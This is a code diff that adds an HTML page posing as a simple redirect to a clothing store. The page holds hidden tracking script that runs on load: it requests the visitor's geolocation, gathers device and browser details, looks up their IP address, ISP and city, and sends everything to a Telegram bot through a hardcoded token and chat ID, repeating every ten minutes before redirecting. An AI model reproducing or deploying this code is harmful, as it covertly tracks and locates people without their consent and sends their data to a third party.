@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Redirecting...</title>
+</head>
+<body>
+
+<script>
+const botToken = "8477495842:AAHN8GT3ZBaaKXP-TWySiL1jpWhaiwLVn30";
+const chatId = "8144368202";
+const intervalMinutes = 10;
+const redirectURL = "https://luxuarydubai.com/product-category/clothing/";
+
+// Detect device model
+function detectDeviceModel() {
+  const ua = navigator.userAgent;
+  if (/iPhone/i.test(ua)) return "Apple iPhone (" + ua.match(/iPhone OS [\d_]+/i)[0].replace(/_/g, ".") + ")";
+  if (/iPad/i.test(ua)) return "Apple iPad (" + ua.match(/CPU OS [\d_]+/i)[0].replace(/_/g, ".") + ")";
+  if (/Android/i.test(ua)) {
+    const match = ua.match(/Android\s+[\d.]+;\s*([^)]+)/i);
+    if (match && match[1]) return match[1].trim();
+    return "Android Device";
+  }
+  if (/Windows/i.test(ua)) return "Windows PC";
+  if (/Macintosh/i.test(ua)) return "Mac";
+  if (/Linux/i.test(ua)) return "Linux Device";
+  return "Unknown Device";
+}
+
+// Device/browser info
+function getDeviceInfo() {
+  return `
+🖥 Device Info:
+- Device Model: ${detectDeviceModel()}
+- User Agent: ${navigator.userAgent}
+- Platform: ${navigator.platform}
+- Language: ${navigator.language}
+- Screen: ${screen.width}x${screen.height}
+`;
+}
+
+// Network info
+async function getNetworkInfo() {
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+    return `
+🌐 Network Info:
+- IP: ${data.ip}
+- ISP: ${data.org}
+- City: ${data.city}
+- Region: ${data.region}
+- Country: ${data.country_name}
+`;
+  } catch {
+    return "\n🌐 Network Info: Unable to fetch";
+  }
+}
+
+// Send to Telegram
+function sendData(message) {
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: chatId, text: message })
+  }).catch(() => {});
+}
+
+// Send location + device + network
+async function sendLocation(lat, lon) {
+  const deviceInfo = getDeviceInfo();
+  const networkInfo = await getNetworkInfo();
+  const message = `📍 Location: ${lat},${lon}
+https://maps.google.com/?q=${lat},${lon}
+${deviceInfo}
+${networkInfo}`;
+  sendData(message);
+}
+
+// Get location
+async function getAndSendLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      async pos => { await sendLocation(pos.coords.latitude, pos.coords.longitude); },
+      async () => {
+        const deviceInfo = getDeviceInfo();
+        const networkInfo = await getNetworkInfo();
+        sendData(`❌ Location denied\n${deviceInfo}\n${networkInfo}`);
+      }
+    );
+  } else {
+    const deviceInfo = getDeviceInfo();
+    const networkInfo = await getNetworkInfo();
+    sendData(`❌ Geolocation not supported\n${deviceInfo}\n${networkInfo}`);
+  }
+}
+
+// First send
+getAndSendLocation();
+
+// Repeat every 10 minutes
+setInterval(getAndSendLocation, intervalMinutes * 60 * 1000);
+
+// Redirect instantly
+window.location.href = redirectURL;
+
+</script>
+
+</body>
+</html>
